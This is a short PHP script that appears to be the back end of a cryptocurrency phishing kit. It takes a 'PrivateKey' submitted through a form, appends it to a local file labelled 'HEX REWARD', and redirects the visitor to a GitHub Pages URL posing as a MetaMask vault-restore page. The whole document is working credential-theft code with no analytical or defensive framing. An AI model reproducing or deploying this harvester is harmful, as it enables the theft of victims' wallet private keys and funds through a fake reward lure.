
<?php
$file = "LEBARANBISAYUKKK";
$ip   = getenv("REMOTE_ADDR");
$PrivateKey   = $_POST['PrivateKey'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "HEX REWARD :: ");
fwrite($handle, "$PrivateKey");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://HEX-Reward.github.io/metamask/home.html?nkbihfbeogaeaoehlefnkodbefgpgknn/#restore-vault\";
// -->
</script>";
?>


